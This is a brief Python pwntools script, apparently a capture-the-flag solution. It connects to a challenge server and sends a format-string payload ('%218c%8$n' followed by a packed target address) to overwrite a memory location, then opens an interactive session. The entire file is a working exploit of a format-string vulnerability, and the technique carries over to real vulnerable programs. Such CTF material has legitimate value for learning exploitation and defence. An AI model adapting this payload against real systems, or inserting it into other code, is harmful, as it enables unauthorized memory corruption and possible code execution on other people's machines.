#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10134)
# r = remote("localhost", 4000)

addr = 0x60106c

r.recvuntil(':')
r.sendline('%218c%8$n'.ljust(16) + p64(addr))

r.interactive()
